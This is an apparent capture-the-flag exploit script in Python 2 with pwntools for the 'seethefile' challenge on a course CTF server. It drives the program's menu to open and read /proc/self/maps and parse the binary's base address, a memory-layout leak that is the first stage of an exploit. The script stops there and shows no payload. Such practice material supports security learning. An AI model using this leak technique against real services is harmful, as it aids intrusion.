#!/usr/bin/env python2
from pwn import *

file1, file2  = "./seethefile", "./libc-2.23.so"
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10144

r, context.binary = remote(server, port), file1
# ========================================================================
binary, libc = ELF(file1), ELF(file2)

# $$$$$$$$$$$$$$$$$$$$$$$$
#        Seethefile       
# $$$$$$$$$$$$$$$$$$$$$$$$
#   1. Open               
#   2. Read               
#   3. Write              
#   4. Exit               
# $$$$$$$$$$$$$$$$$$$$$$$$
# Your choice :

def OpenFile( filename ):
    r.sendlineafter( "Your choice :", "1"      )
    r.sendlineafter( "Filnename:"   , filename )

def ReadFile():
    r.sendlineafter( "Your choice :", "2" )

def WriteFile():
    r.sendlineafter( "Your choice :", "3" )
    r.recvuntil    ( "Data :"             )

def Exit( data ):
    r.sendlineafter( "Your choice :"    , "4"  )
    r.sendlineafter( "Leave your name :", data )

OpenFile("/proc/self/maps")
ReadFile()
WriteFile()
code = int(r.recvuntil("-")[:-1], 16)
print "code:", hex(code)

print "@@"

r.interactive()
